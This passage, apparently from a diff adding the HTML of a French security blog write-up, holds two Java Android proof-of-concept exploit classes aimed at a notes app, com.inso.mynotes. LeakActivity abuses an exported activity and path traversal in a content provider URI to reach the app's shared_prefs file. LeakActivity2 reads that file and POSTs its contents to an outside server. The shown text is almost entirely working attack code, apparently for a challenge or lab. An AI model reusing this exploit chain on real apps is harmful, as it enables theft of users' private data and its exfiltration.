+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LeakActivity</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AppCompatActivity</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">savedInstanceState</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">(</span><span class="n">savedInstanceState</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setContentView</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">layout</span><span class="p">.</span><span class="na">activity_leak</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">getIntent</span><span class="p">().</span><span class="na">hasExtra</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// LEAK</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">a</span><span class="w"> </span><span class="n">debg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getIntent</span><span class="p">().</span><span class="na">getParcelableExtra</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">fnname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">debg</span><span class="p">.</span><span class="na">getD</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="s">&#34;poc&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;STEP 1: Leak random filename - &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">debg</span><span class="p">.</span><span class="na">getD</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// ACCESS CONTENT PROVIDER</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Intent</span><span class="w"> </span><span class="n">nxt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// PATH TRAVERSAL getLastPathSegment()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">nxt</span><span class="p">.</span><span class="na">setData</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&#34;content://com.inso.provider/..%2f..%2f..%2f..%2fdata%2fdata%2fcom.inso.mynotes%2fshared_prefs%2f&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">debg</span><span class="p">.</span><span class="na">getD</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;.xml&#34;</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">nxt</span><span class="p">.</span><span class="na">setFlags</span><span class="p">(</span><span class="n">Intent</span><span class="p">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">nxt</span><span class="p">.</span><span class="na">setClassName</span><span class="p">(</span><span class="n">getPackageName</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;com.inso.exploit2.LeakActivity2&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Intent</span><span class="w"> </span><span class="n">expl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">expl</span><span class="p">.</span><span class="na">setClassName</span><span class="p">(</span><span class="s">&#34;com.inso.mynotes&#34;</span><span class="p">,</span><span class="s">&#34;com.inso.mynotes.NoteAPI&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">expl</span><span class="p">.</span><span class="na">setFlags</span><span class="p">(</span><span class="n">Intent</span><span class="p">.</span><span class="na">FLAG_ACTIVITY_SINGLE_TOP</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">expl</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="s">&#34;nxt&#34;</span><span class="p">,</span><span class="n">nxt</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">startActivity</span><span class="p">(</span><span class="n">expl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>LeakActivity2.java</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LeakActivity2</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AppCompatActivity</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">savedInstanceState</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">(</span><span class="n">savedInstanceState</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setContentView</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="na">layout</span><span class="p">.</span><span class="na">activity_leak2</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InputStream</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getContentResolver</span><span class="p">().</span><span class="na">openInputStream</span><span class="p">(</span><span class="n">getIntent</span><span class="p">().</span><span class="na">getData</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">convertInputStreamToString</span><span class="p">(</span><span class="n">i</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="s">&#34;poc&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;STEP 2:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">result</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;http://mysuperserver.ch/&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">OkHttpClient</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">OkHttpClient</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">RequestBody</span><span class="w"> </span><span class="n">body</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestBody</span><span class="p">.</span><span class="na">create</span><span class="p">(</span><span class="n">MediaType</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&#34;application/xml&#34;</span><span class="p">),</span><span class="n">result</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Request</span><span class="p">.</span><span class="na">Builder</span><span class="p">().</span><span class="na">url</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="na">post</span><span class="p">(</span><span class="n">body</span><span class="p">).</span><span class="na">build</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">client</span><span class="p">.</span><span class="na">newCall</span><span class="p">(</span><span class="n">request</span><span class="p">).</span><span class="na">enqueue</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Callback</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onFailure</span><span class="p">(</span><span class="n">Call</span><span class="w"> </span><span class="n">call</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onResponse</span><span class="p">(</span><span class="n">Call</span><span class="w"> </span><span class="n">call</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="na">isSuccessful</span><span class="p">()){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">Log</span><span class="p">.</span><span class="na">d</span><span class="p">(</span><span class="s">&#34;http&#34;</span><span class="p">,</span><span class="s">&#34;ok&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">FileNotFoundException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">convertInputStreamToString</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">is</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[</span><span class="n">8192</span><span class="o">]</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">is</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">valueOf</span><span class="p">(</span><span class="n">StandardCharsets</span><span class="p">.</span><span class="na">UTF_8</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div>
+                <br>
+                
+                <p class="back-to-posts"><a href="https://2dai.github.io/blog">Retour aux articles</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                
+            </div>
+            
+        </div>
+    </div>
+</section>
+
+
+
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js"></script>
+  
+
+  <script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+  </script>
+
+
+
+
+
+</body>
+</html>
+
